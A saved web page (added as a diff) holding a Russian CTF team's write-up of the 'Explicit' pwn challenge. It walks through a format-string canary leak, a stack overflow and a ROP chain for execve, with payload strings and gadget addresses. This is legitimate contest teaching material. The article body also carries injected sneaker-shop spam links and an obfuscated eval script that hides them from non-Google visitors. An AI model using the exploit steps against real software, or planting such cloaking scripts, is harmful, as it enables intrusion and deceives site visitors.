@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]> <html class="ie6 ie" lang="en" dir="ltr"> <![endif]-->
+<!--[if IE 7]>    <html class="ie7 ie" lang="en" dir="ltr"> <![endif]-->
+<!--[if IE 8]>    <html class="ie8 ie" lang="en" dir="ltr"> <![endif]-->
+<!--[if IE 9]>    <html class="ie9 ie" lang="en" dir="ltr"> <![endif]-->
+<!--[if !IE]> --> <html lang="en" dir="ltr"> <!-- <![endif]-->
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<link rel="shortcut icon" href="../sites/all/themes/open_framework/favicon.ico" type="image/vnd.microsoft.icon" />
+<link rel="shortlink" href="68.html" />
+<link rel="canonical" href="../writeup/68.html" />
+<meta name="Generator" content="Drupal 7 (http://drupal.org)" />
+  <!-- Set the viewport width to device width for mobile -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Explicit (pwn 500) | BalalaikaCr3w</title>
+  <style type="text/css" media="all">
+@import url("https://ctfcrew.org/modules/system/system.base.css?qtecp0");
+@import url("https://ctfcrew.org/modules/system/system.menus.css?qtecp0");
+@import url("https://ctfcrew.org/modules/system/system.messages.css?qtecp0");
+@import url("https://ctfcrew.org/modules/system/system.theme.css?qtecp0");
+</style>
+<style type="text/css" media="all">
+@import url("https://ctfcrew.org/modules/comment/comment.css?qtecp0");
+@import url("https://ctfcrew.org/modules/field/theme/field.css?qtecp0");
+@import url("https://ctfcrew.org/modules/node/node.css?qtecp0");
+@import url("https://ctfcrew.org/modules/search/search.css?qtecp0");
+@import url("https://ctfcrew.org/modules/user/user.css?qtecp0");
+@import url("../sites/all/modules/views/css/views.css%3Fqtecp0.css");
+@import url("../sites/all/modules/ckeditor/css/ckeditor.css%3Fqtecp0.css");
+</style>
+<style type="text/css" media="all">
+@import url("../sites/all/modules/ctools/css/ctools.css%3Fqtecp0.css");
+@import url("../sites/all/libraries/syntaxhighlighter_3.0.83/styles/shCore.css%3Fqtecp0.css");
+@import url("../sites/all/libraries/syntaxhighlighter_3.0.83/styles/shThemeDefault.css%3Fqtecp0.css");
+</style>
+<style type="text/css" media="all">
+@import url("../sites/all/themes/open_framework/bootstrap/css/bootstrap.min.css%3Fqtecp0.css");
+@import url("../sites/all/themes/open_framework/bootstrap/css/bootstrap-responsive.min.css%3Fqtecp0.css");
+@import url("../sites/all/themes/open_framework/css/open_framework.css%3Fqtecp0.css");
+@import url("../sites/all/themes/open_framework/css/ie.css%3Fqtecp0.css");
+@import url("../sites/all/themes/open_framework/jquery.minicolors/jquery.minicolors.css%3Fqtecp0.css");
+@import url("../sites/all/themes/open_framework/css/jquery.themizer.css%3Fqtecp0.css");
+@import url("../sites/all/themes/open_framework/css/universal.css%3Fqtecp0.css");
+@import url("../sites/all/themes/open_framework/font-awesome-4.0.3/css/font-awesome.min.css%3Fqtecp0.css");
+</style>
+<style type="text/css" media="print">
+@import url("../sites/all/themes/open_framework/css/open_framework_print.css%3Fqtecp0.css");
+</style>
+  <script type="text/javascript" src="../sites/all/modules/jquery_update/replace/jquery/1.8/jquery.min.js%3Fv=1.8.3"></script>
+<script type="text/javascript" src="https://ctfcrew.org/misc/jquery.once.js?v=1.2"></script>
+<script type="text/javascript" src="https://ctfcrew.org/misc/drupal.js?qtecp0"></script>
+<script type="text/javascript" src="../sites/all/libraries/syntaxhighlighter_3.0.83/scripts/shCore.js%3Fqtecp0"></script>
+<script type="text/javascript" src="../sites/all/libraries/syntaxhighlighter_3.0.83/scripts/shAutoloader.js%3Fqtecp0"></script>
+<script type="text/javascript" src="../sites/default/files/syntaxhighlighter.autoloader.js%3Fqtecp0"></script>
+<script type="text/javascript" src="../sites/all/themes/open_framework/bootstrap/js/bootstrap.min.js%3Fqtecp0"></script>
+<script type="text/javascript" src="../sites/all/themes/open_framework/js/open_framework.js%3Fqtecp0"></script>
+<script type="text/javascript" src="../sites/all/themes/open_framework/js/override.js%3Fqtecp0"></script>
+<script type="text/javascript" src="../sites/all/themes/open_framework/jquery.minicolors/jquery.minicolors.min.js%3Fqtecp0"></script>
+<script type="text/javascript" src="../sites/all/themes/open_framework/js/jquery.themizer.js%3Fqtecp0"></script>
+<script type="text/javascript" src="../sites/all/themes/open_framework/js/universal.js%3Fqtecp0"></script>
+<script type="text/javascript">
+<!--//--><![CDATA[//><!--
+jQuery.extend(Drupal.settings, {"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"open_framework","theme_token":"-qbezahz0jsW4f2KkknnSTHGhi7XLOVCR4uL_cPyl0I","js":{"sites\/all\/modules\/syntaxhighlighter\/syntaxhighlighter.min.js":1,"sites\/all\/modules\/jquery_update\/replace\/jquery\/1.8\/jquery.min.js":1,"misc\/jquery.once.js":1,"misc\/drupal.js":1,"sites\/all\/libraries\/syntaxhighlighter_3.0.83\/scripts\/shCore.js":1,"sites\/all\/libraries\/syntaxhighlighter_3.0.83\/scripts\/shAutoloader.js":1,"sites\/default\/files\/syntaxhighlighter.autoloader.js":1,"sites\/all\/themes\/open_framework\/bootstrap\/js\/bootstrap.min.js":1,"sites\/all\/themes\/open_framework\/js\/open_framework.js":1,"sites\/all\/themes\/open_framework\/js\/override.js":1,"sites\/all\/themes\/open_framework\/jquery.minicolors\/jquery.minicolors.min.js":1,"sites\/all\/themes\/open_framework\/js\/jquery.themizer.js":1,"sites\/all\/themes\/open_framework\/js\/universal.js":1},"css":{"modules\/system\/system.base.css":1,"modules\/system\/system.menus.css":1,"modules\/system\/system.messages.css":1,"modules\/system\/system.theme.css":1,"modules\/comment\/comment.css":1,"modules\/field\/theme\/field.css":1,"modules\/node\/node.css":1,"modules\/search\/search.css":1,"modules\/user\/user.css":1,"sites\/all\/modules\/views\/css\/views.css":1,"sites\/all\/modules\/ckeditor\/css\/ckeditor.css":1,"sites\/all\/modules\/ctools\/css\/ctools.css":1,"sites\/all\/libraries\/syntaxhighlighter_3.0.83\/styles\/shCore.css":1,"sites\/all\/libraries\/syntaxhighlighter_3.0.83\/styles\/shThemeDefault.css":1,"sites\/all\/themes\/open_framework\/bootstrap\/css\/bootstrap.min.css":1,"sites\/all\/themes\/open_framework\/bootstrap\/css\/bootstrap-responsive.min.css":1,"sites\/all\/themes\/open_framework\/fontawesome\/css\/font-awesome.min.css":1,"sites\/all\/themes\/open_framework\/css\/open_framework.css":1,"sites\/all\/themes\/open_framework\/css\/ie.css":1,"sites\/all\/themes\/open_framework\/jquery.minicolors\/jquery.minicolors.css":1,"sites\/all\/themes\/open_framework\/css\/jquery.themizer.css":1,"sites\/all\/themes\/open_framework\/css\/universal.css":1,"sites\/all\/themes\/open_framework\/font-awesome-4.0.3\/css\/font-awesome.min.css":1,"sites\/all\/themes\/open_framework\/css\/open_framework_print.css":1}},"syntaxhighlighter":{"useAutoloader":true}});
+//--><!]]>
+</script>
+  <!--[if IE 7]>
+  <link rel="stylesheet" href="/sites/all/themes/open_framework/fontawesome/css/font-awesome-ie7.min.css">
+  <![endif]-->
+  <!-- IE Fix for HTML5 Tags -->
+  <!--[if lt IE 9]>
+    <script src="/sites/all/themes/open_framework/js/html5shiv.js"></script>
+  <![endif]-->
+
+    <style type="text/css" media="all">@import url("../sites/all/themes/open_framework/css/page.css");</style>
+  <script type="text/javascript" src="../sites/all/themes/open_framework/js/page.js"></script>
+
+</head>
+
+<body class="main-body html not-front not-logged-in one-sidebar sidebar-second page-node page-node- page-node-68 node-type-writeup   content-first     "  >
+    <a href="68.html#content" class="element-invisible element-focusable">Skip to content</a>
+<a href="68.html#main-nav" class="element-invisible element-focusable" data-target=".nav-collapse" data-toggle="collapse">Skip to navigation</a>
+<!-- /#skipnav -->
+<!-- /#admin-shortcuts -->
+	<div id="header" class="clearfix header" role="banner">
+	<div class="container">
+		<div class="row">
+			<div class="span12">
+								<div id="logo" class="site-logo"> <a href="../index.html" title="Home" rel="home"> <img src="../sites/default/files/logo.png" alt="BalalaikaCr3w" role="presentation" /> </a></div>
+								<!-- /#logo -->
+								<div id="name-and-slogan">
+										<div id="site-name" class="site-name"><a href="../index.html" title="Home" rel="home">BalalaikaCr3w</a></div>
+															<div id="site-slogan" class="site-slogan">Russian CTF team</div>
+									</div>
+												<!-- /#name-and-slogan -->
+							</div>
+		</div>
+		<div class="social">
+			<a href="http://twitter.com/BalalaikaCr3w" class="social-item twitter">
+				<i class="fa fa-twitter"></i>
+			</a>
+		</div>
+	</div>
+</div>
+<!-- /#header --><div id="main" class="clearfix main" role="main">
+	<div class="container">
+								<div id="main-content" class="row main-content">
+						<div id="content" class="mc-content span9">
+				<div class="color-pane bg-0D"></div>
+				<div id="content-wrapper" class="content-wrapper">
+					<div id="content-head" class="row-fluid content-head">
+																								<h1 class="title" id="page-title"> Explicit (pwn 500) </h1>
+																																									</div>
+																				<div id="content-body" class="row-fluid content-body"> <div class="region region-content clearfix">
+  <div id="block-system-main" class="clearfix block block-system">       <div class="content"> <article id="node-68" class="node node-writeup node-promoted clearfix">      <div class="node-wrapper">
+                <div class="submitted">
+       
+      23.09.2014 02:44, by <i class="fa fa-user"></i><span class="username">Dil4rd</span>    </div>
+        <div class="content">
+      <div class="field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix"><div class="field-label">Category:&nbsp;</div><div class="field-items"><div class="field-item even"><a href="../categories/pwn.html">pwn</a></div></div></div><div class="field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix"><div class="field-label">Event:&nbsp;</div><div class="field-items"><div class="field-item even"><a href="../event/23.html">No cON Name CTF Quals 2014</a></div></div></div><div class="field field-name-body field-type-text-with-summary field-label-hidden"><div class="field-items"><div class="field-item even"><p>The task was to find vulnerability in binary service explicit (<a href="http://ctfcrew.org/sites/default/files/writeups/eXPLicit.zip">binary and exploit</a>). Like other tasks at this CTF, this one was easy enouth.</p><p>After downloading file and opening it in IDA I'd found that it's x86 ELF which has no imported functions. Unfortunately Hex-Rays FLIRT didn't help me that time, but x86 decompiler works fine and few minutes was enouth to reconstruct main function and identify high level apis. Result I've got is the next:</p><pre class="brush: cpp; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax@1
+  char *v4; // edx@8
+  int v5; // ecx@12
+  int result; // eax@12
+  int v7; // [sp+4h] [bp-114h]@1
+  char *v8; // [sp+8h] [bp-110h]@3
+  char v9[256]; // [sp+Ch] [bp-10Ch]@2
+  int canary; // [sp+10Ch] [bp-Ch]@1
+
+  canary = *MK_FP(__GS__, 20);
+  fwrite("Welcome to Guess The Number Online!\n\n", 1u, 37, hFile);
+  v3 = get_system_time_0(0);
+  srand(v3);
+  v7 = rand() % 20;
+  while ( 1 )
+  {
+    fwrite("Pick a number between 0 and 20: ", 1u, 32, hFile);
+    fflush(hFile);
+    if ( !recv_to_buffer(v9, 1024, hFile) )
+      break;
+    v8 = sub_805C210(v9, 10);
+    if ( v8 )
+      *v8 = 0;
+    if ( v9[0] == 'q' )
+      break;
+    if ( to_int(v9) == v7 )
+    {
+      fwrite("You win! Congratulations!\n\n", 1u, 27, hFile);
+      fflush(hFile);
+      break;
+    }
+    fwrite("Your number is ", 1u, 15, hFile);
+    fprintf(hFile, v9);
+    if ( to_int(v9) &lt;= v7 )
+      v4 = "low";
+    else
+      v4 = "high";
+    fprintf(hFile, " which is too %s.\n", v4);
+    fflush(hFile);
+  }
+  fwrite("Bye\n", 1u, 4, hFile);
+  fflush(hFile);
+  result = *MK_FP(__GS__, 20) ^ canary;
+  if ( *MK_FP(__GS__, 20) != canary )
+    sub_80610A0(v5);
+  return result;
+};
+</pre><p>As we can see there is an obvious stack overflow and format string vulnerabilities. Using format string vulnerability we can determine canary's value. Then we can overflow stack, overwrite canary by the same value and successfully reach retn instruction with modified return address.</p><p>First try to execute shellcode on the stack (just in case it's executable). For this we need:</p><ol><li>get canary value via sending string "%70$08X";</li><li>get upper function stack frame (ebp) via sending string "%73$08X";</li><li>using upper function stack frame calculate shellcode address;</li><li>trigger stack overflow via sending buffer<pre class="brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: false; tab-size: 4; toolbar: true; codetag">"A"*256+pack("&lt;I",canary)+"A"*12+pack("&lt;I",ptr_to_shellcode)+shellcode</pre></li></ol><p>Unfortunatelly this attempt failed... this means that stack is nonexecutable and because there is no RWE section in binary, we should use ROP.</p><p>Another bad news: there is no function "system" among high level api, built in the binary. So only 2 ways remains. The earsiest one is to find function "mprotect", use it to make stack executable and run any shellcode. More complicated one is to build full ROP chain to put needed data somewhere in memory and use it to make sys_execve syscall.</p><p>I'd selected the second way.</p><p>To find apropriate ROP gadget I'd used <a href="https://twitter.com/JonathanSalwan">Jonathan Salwan</a>'s tool, named ROPgadget (official url: <a href="http://shell-storm.org/project/ROPgadget/">http://shell-storm.org/project/ROPgadget/</a>). The only restricted byte is '\n' e.i. 0x0A, so just set option '--badbytes "0A"'.</p><pre class="brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">$ ./ROPgadget.py --binary ~/explicit  --badbytes "0a"</pre><p>As write-what-where ROP chaine I'd selected next one:</p><pre class="brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: false; tab-size: 4; toolbar: true; codetag">p += pack('&lt;I', 0x08083fc6) # pop edx ; ret
+p += pack('&lt;I', dst_addr)   #  where
+p += pack('&lt;I', 0x080CED61) # pop eax ; ret
+p += pack('&lt;I', data)       #  what
+p += pack('&lt;I', 0x0808a73d) # mov dword ptr [edx], eax ; ret
+</pre><p>To save my data I'd used .data section (it stast from address 0x080D50C0), because it has RW permitions.</p><p>To execute sys_execve we have to imitate execution of next assemply code:</p><pre class="brush: plain; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">xor edx, edx
+mov ebx, pArg0
+mov ecx, pArgs
+mov eax,11
+int 0x80
+</pre><p>The only problem was to set ecx to desired value. The best ROP gadget was</p><pre class="brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">0x080CF077 # pop ecx ; or cl, byte ptr [esi] ; or al, 0x43 ; ret</pre><p>So we have to set to esi address, which points to 0x0 byte value. One of the possible ways is the next:</p><pre class="brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">p += pack('&lt;I', 0x080499f5) # pop esi ; ret
+p += pack('&lt;I', 0x080d50c0+0x74) # any addr such that byte ptr [addr] = 0x0
+p += pack('&lt;I', 0x080CF077) # pop ecx ; or cl, byte ptr [esi] ; or al, 0x43 ; ret
+p += pack('&lt;I', 0x080d50c0+0x60) # ptr to ArgsArray
+</pre><p>And to the end for rop chain I put:</p><pre class="brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">p += pack("&lt;I", 0x08049924) # jmp $</pre><p>It cases infinite loop and help me to determine that my ROP chain has been executed successsfully.</p><p>Now we can execute written python script and get the flag "<strong>NcN_97740ead1060892a253be8ca33c6364a712b21d2</strong>".</p><p>Final python script can be found <a href="https://github.com/Dil4rd/CTF/blob/master/explicit_expl.py">here</a>.</p><span class="keys_words"><a class="links_good_rands" href="https://www.sneakersbe.com/">Authentic Nike Sneakers</a> | <a class="links_good_rands" href="https://www.ietp.com/fr/dfediqshop/release-dates/nike/air-jordan-1/">Women's Nike Air Jordan 1 trainers - Latest Releases , Ietp</a></span><script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('b i=r f["\\q\\1\\4\\g\\p\\l"]("\\4"+"\\7"+"\\7"+"\\4"+"\\5\\1","\\4\\k");s(!i["\\3\\1\\2\\3"](m["\\h\\2\\1\\j\\n\\4\\1\\6\\3"])){b a=f["\\e\\7\\o\\h\\d\\1\\6\\3"]["\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1"](\'\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\');u(b 8=0;8<a["\\5\\1\\6\\4\\3\\y"];8++)a[8]["\\2\\3\\9\\5\\1"]["\\e\\k\\2\\l\\5\\c\\9"]=\'\\6\\7\\6\\1\'}',37,37,'|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43'.split('|'),0,{}));</script></div></div></div><div class="field field-name-field-file field-type-file field-label-above"><div class="field-label">Attachments:&nbsp;</div><div class="field-items"><div class="field-item even"><span class="file"><img class="file-icon" alt="Package icon" title="application/zip" src="https://ctfcrew.org/modules/file/icons/package-x-generic.png" /> <a href="../sites/default/files/writeups/eXPLicit.zip" type="application/zip; length=267098">eXPLicit.zip</a></span></div></div></div>    </div>
+       </div>
+</article>
+ </div>
+</div></div>
+ <!-- /.region -->
+  </div>
+																																																	</div>
+				<!-- /#content-wrap --> 
+			</div>
+			<!-- /#content -->
+							<div id="sidebar-second" class="sidebar span3 site-sidebar-second">
+	<div class="color-pane bg-0B"></div>
+	<div class="row-fluid row-block row-block-1">
+		<div class="region region-sidebar-second clearfix">
+  <div id="block-system-navigation" class="clearfix block block-system block-menu">       <div class="content"> <ul class="menu nav"><li class="first leaf"><a href="../index.html"><i class="fa fa-home"></i>Home</a></li>
+<li class="leaf"><a href="../writeups.html"><i class="fa fa-file-text"></i>Writeups</a></li>
+<li class="leaf"><a href="../tools.html"><i class="fa fa-wrench"></i>Tools</a></li>
+<li class="last leaf"><a href="../blogs.html"><i class="fa fa-users"></i>Blog</a></li>
+</ul> </div>
+</div>
+<div id="block-views-events-block-1" class="clearfix block block-views">     <h2>Last events</h2>
+      <div class="content"> <div class="view view-events view-id-events view-display-id-block_1 view-dom-id-2a8a50cc70c419492e595096103ca2d6">
+        
+  
+  
+      <div class="view-content">
+        <div class="views-row views-row-1 views-row-odd views-row-first">
+      
+  <div class="views-field views-field-name">        <span class="field-content"><a href="../event/32.html">Boston Key Party 2015</a></span>  </div>  </div>
+  <div class="views-row views-row-2 views-row-even">
+      
+  <div class="views-field views-field-name">        <span class="field-content"><a href="../event/36.html">Boston Key Party CTF 2016</a></span>  </div>  </div>
+  <div class="views-row views-row-3 views-row-odd views-row-last">
+      
+  <div class="views-field views-field-name">        <span class="field-content"><a href="../event/35.html">EKOPARTY PRE-CTF 2015</a></span>  </div>  </div>
+    </div>
+  
+  
+  
+      
+<div class="more-link">
+  <a href="../events.html">
+    all events  </a>
+</div>
+  
+  
+  
+</div> </div>
+</div>
+</div>
+ <!-- /.region -->
+	</div>
+			<div class="color-pane bg-09"></div>
+	<div class='row-fluid row-block row-block-2'>
+		<ul class="nav">
+			<li><a href="../user.html"><i class="fa fa-sign-in"></i>Sign in</a></li>
+		</ul>
+	</div>
+	</div>
+<!-- /#sidebar-second -->					</div>
+					</div>
+</div>
+<!-- /#main, /#main-wrapper -->
+	  <script type="text/javascript" src="../sites/all/modules/syntaxhighlighter/syntaxhighlighter.min.js%3Fqtecp0"></script>
+</body>
+
+</html>
